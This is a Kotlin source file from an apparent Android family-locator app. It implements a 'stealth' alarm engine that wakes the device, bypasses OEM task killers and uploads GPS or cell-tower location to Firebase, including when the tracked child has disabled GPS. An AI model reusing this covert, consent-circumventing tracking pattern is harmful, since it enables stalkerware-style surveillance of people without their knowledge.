package com.jdroidx.jfindme.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.Tasks
import com.jdroidx.jfindme.data.local.DatabaseHelper
import com.jdroidx.jfindme.data.model.UserLocation
import com.jdroidx.jfindme.data.remote.FirebaseComm
import com.jdroidx.jfindme.engine.location.CellTowerSentinel
import com.jdroidx.jfindme.engine.location.GeohashHelper
import com.jdroidx.jfindme.engine.sync.TelemetryFailoverRouter
import com.jdroidx.jfindme.receiver.StealthAlarmReceiver
import com.jdroidx.jfindme.utils.DeviceIdentityHelper
import com.jdroidx.jfindme.utils.RegistryManager
import com.jdroidx.jfindme.utils.SystemLogger
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * ⏰ StealthAlarmSentinelEngine (20-Year Enterprise Architecture)
 *
 * Implements the "Alarm Buzz" autonomous background wake pattern.
 * Uses AlarmManager.setAlarmClock() to break through aggressive OEM task killers
 * (Samsung OneUI, Xiaomi HyperOS, Vivo OriginOS, Oppo ColorOS) with minimal battery footprint.
 *
 * [Variables]
 * - intervalMins: Active dormant schedule cadence (Default: 60 mins)
 * - wakeLock: PowerManager.PARTIAL_WAKE_LOCK with strict 120s safety cutoff
 * - resolvedLat, resolvedLng: Spatial coordinates (fused or SQLite fallback)
 * - fallbackPayload: Map containing cellular baseband telemetry when GPS is denied
 *
 * [Constants]
 * - TAG = "StealthAlarmSentinel"
 * - STEALTH_ALARM_REQ_CODE = 8801
 * - WAKELOCK_TAG = "jFindMe:StealthAlarmSentinelWakeLock"
 * - WAKELOCK_TIMEOUT_MS = 120_000L
 *
 * [Dependencies]
 * - android.app.AlarmManager
 * - com.jdroidx.jfindme.engine.location.CellTowerSentinel
 * - com.jdroidx.jfindme.engine.sync.TelemetryFailoverRouter
 * - com.jdroidx.jfindme.data.remote.FirebaseComm
 *
 * [Integration Points]
 * - StealthAlarmReceiver.kt: Receives ACTION_STEALTH_PULSE
 * - DatabaseHelper.kt: stealth_schedule_config table & security_audit_log
 * - SecurityReceiver.kt: Re-arms on boot/unlock and fast-fails on GPS toggle
 * - Firebase RTDB: /devices/{agentId}/telemetry & /devices/{agentId}/device/live
 */
object StealthAlarmSentinelEngine {

    private const val TAG = "StealthAlarmSentinel"
    private const val STEALTH_ALARM_REQ_CODE = 8801
    private const val WAKELOCK_TAG = "jFindMe:StealthAlarmSentinelWakeLock"
    private const val WAKELOCK_TIMEOUT_MS = 120_000L // 120s safety cutoff

    @JvmStatic
    fun scheduleNextStealthPulse(context: Context, customIntervalMins: Long = 0L) {
        val appContext = context.applicationContext ?: context
        val dbHelper = DatabaseHelper.getInstance(appContext)

        val intervalMins = if (customIntervalMins > 0) {
            customIntervalMins
        } else {
            dbHelper.getStealthIntervalMins().takeIf { it > 0 } ?: 60L
        }

        val alarmManager = appContext.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            ?: return

        val intent = Intent(appContext, StealthAlarmReceiver::class.java).apply {
            action = StealthAlarmReceiver.ACTION_STEALTH_PULSE
        }

        val pendingIntent = PendingIntent.getBroadcast(
            appContext,
            STEALTH_ALARM_REQ_CODE,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val triggerAtMillis = System.currentTimeMillis() + (intervalMins * 60 * 1000L)

        try {
            // Android 12+ (API 31+) exact alarm eligibility check
            val canScheduleExact = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                alarmManager.canScheduleExactAlarms()
            } else {
                true
            }

            if (canScheduleExact && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val alarmClockInfo = AlarmManager.AlarmClockInfo(triggerAtMillis, pendingIntent)
                alarmManager.setAlarmClock(alarmClockInfo, pendingIntent)
                SystemLogger.i(TAG, "AlarmClock programmed: Fires in $intervalMins mins at $triggerAtMillis")
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent)
                SystemLogger.i(TAG, "setExactAndAllowWhileIdle programmed: Fires in $intervalMins mins at $triggerAtMillis")
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent)
            }

            appContext.getSharedPreferences("system_registry", Context.MODE_PRIVATE)
                .edit()
                .putLong("pref_next_stealth_alarm_epoch", triggerAtMillis)
                .apply()
        } catch (secEx: SecurityException) {
            SystemLogger.e(TAG, "Exact alarm permission restricted: ${secEx.message}. Falling back to setAndAllowWhileIdle.")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent)
                } else {
                    alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent)
                }
            } catch (e: Exception) {
                SystemLogger.e(TAG, "Fatal fallback alarm failure: ${e.message}")
            }
        }
    }

    @JvmStatic
    fun executeStealthPulseWithWakeLock(context: Context, onComplete: () -> Unit) {
        val appContext = context.applicationContext ?: context
        val pm = appContext.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)?.apply {
            setReferenceCounted(false)
            acquire(WAKELOCK_TIMEOUT_MS)
        }

        SystemLogger.i(TAG, "WakeLock acquired. Executing autonomous cellular/telemetry pulse...")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val dbHelper = DatabaseHelper.getInstance(appContext)
                val hwId = DeviceIdentityHelper.getHardwareUid(appContext)
                val agentId = DeviceIdentityHelper.getOrGenerateAgentId(appContext)
                val prefs = appContext.getSharedPreferences("system_registry", Context.MODE_PRIVATE)
                val now = System.currentTimeMillis()
                val forensicTs = FirebaseComm.getForensicTimestamp(now)

                // 1. Proactively extract cellular tower hardware info (even if GPS is disabled by kid)
                val cellData = CellTowerSentinel.extractServingCellInfo(appContext)
                SystemLogger.d(TAG, "Stealth SIM Harvest: op=${cellData.operator}, mcc=${cellData.mcc}, mnc=${cellData.mnc}, lac=${cellData.lac}, cid=${cellData.cid}")

                dbHelper.logSimTransaction(
                    cellData.slot,
                    cellData.mcc,
                    cellData.mnc,
                    cellData.lac,
                    cellData.cid,
                    0.0,
                    0.0,
                    "STEALTH_ALARM_PULSE"
                )

                // 2. Attempt fast fused location fix (10s timeout)
                var resolvedLat = 0.0
                var resolvedLng = 0.0
                var resolvedAcc = 100f
                var resolvedSpeed = 0f
                var resolvedBearing = 0f

                try {
                    val fusedClient = LocationServices.getFusedLocationProviderClient(appContext)
                    val locTask = fusedClient.lastLocation
                    val loc = Tasks.await(locTask, 10, TimeUnit.SECONDS)
                    if (loc != null && (loc.latitude != 0.0 || loc.longitude != 0.0)) {
                        resolvedLat = loc.latitude
                        resolvedLng = loc.longitude
                        resolvedAcc = loc.accuracy
                        resolvedSpeed = loc.speed
                        resolvedBearing = loc.bearing
                    }
                } catch (locEx: Exception) {
                    SystemLogger.w(TAG, "Fused location unavailable during stealth pulse: ${locEx.message}")
                }

                // Fallback to SQLite last saved position if GPS cold
                if (resolvedLat == 0.0 && resolvedLng == 0.0) {
                    resolvedLat = RegistryManager.getLastKnownLatitude(appContext)
                    resolvedLng = RegistryManager.getLastKnownLongitude(appContext)
                }

                if (resolvedLat != 0.0 && resolvedLng != 0.0) {
                    val ssotAvatar = dbHelper.getDeviceCentricAvatar(agentId)
                    val resolvedAvatar = if (ssotAvatar.isNotEmpty() && ssotAvatar != "butterfly") ssotAvatar else "butterfly"
                    val resolvedName = prefs.getString("user_nickname", "Family Member") ?: "Family Member"

                    val userLoc = UserLocation(
                        userId = agentId,
                        deviceId = hwId,
                        latitude = resolvedLat,
                        longitude = resolvedLng,
                        geohash = GeohashHelper.encode(resolvedLat, resolvedLng),
                        bearing = resolvedBearing,
                        speed = resolvedSpeed,
                        timestamp = forensicTs,
                        allowDependents = prefs.getBoolean("allow_dependents", true),
                        active_group = prefs.getString("active_group", "") ?: "",
                        isForensicAudit = true,
                        userName = resolvedName,
                        avatar_id = resolvedAvatar
                    )

                    val result = TelemetryFailoverRouter.dispatchLocationWithFailover(appContext, userLoc)
                    SystemLogger.i(TAG, "Stealth Telemetry Dispatched: [${result.routeLabel}] - ${result.detailMessage}")
                } else {
                    // 🛡️ CRITICAL CELLULAR-ONLY FALLBACK: When kid disables GPS and cold coordinates are 0.0,
                    // push cellular baseband pulse to Firebase RTDB so parent map/console sees device is ALIVE with SIM info.
                    SystemLogger.w(TAG, "GPS unavailable (0,0); dispatching pure cellular baseband heartbeat.")
                    val fallbackPayload = mutableMapOf<String, Any>(
                        "last_heartbeat" to forensicTs,
                        "active_route" to "TIER_3_CELLULAR_TOWER",
                        "cellular_mcc_mnc" to "${cellData.mcc}-${cellData.mnc}",
                        "cellular_lac_cid" to "${cellData.lac}-${cellData.cid}",
                        "cellular_signal_dbm" to cellData.signalDbm,
                        "cellular_operator" to cellData.operator,
                        "cellular_network" to cellData.networkType,
                        "location_status" to "GPS_REVOKED_CELL_TOWER_FALLBACK"
                    )

                    try {
                        FirebaseComm.getTelemetryRef(agentId).updateChildren(fallbackPayload)
                        val liveRef = FirebaseComm.getLiveRef(agentId)
                        liveRef.child("last_seen").setValue(forensicTs)
                        liveRef.child("active_route").setValue("TIER_3_CELLULAR_TOWER")
                        liveRef.child("cellular_operator").setValue(cellData.operator)
                        liveRef.child("location_status").setValue("CELL_TOWER_ONLY")
                    } catch (fbEx: Exception) {
                        SystemLogger.e(TAG, "Error pushing cellular-only fallback to Firebase: ${fbEx.message}")
                    }
                }

                dbHelper.logSecurityEvent("STEALTH_PULSE_SUCCESS", "Alarm pulse executed successfully. Route: ${cellData.operator}", "INFO")

            } catch (e: Exception) {
                SystemLogger.e(TAG, "Error during stealth pulse: ${e.message}", e)
            } finally {
                if (wakeLock?.isHeld == true) {
                    try {
                        wakeLock.release()
                        SystemLogger.i(TAG, "WakeLock released cleanly. Device returning to sleep.")
                    } catch (_: Exception) {}
                }
                // Schedule next exact alarm
                scheduleNextStealthPulse(appContext)
                onComplete()
            }
        }
    }
}
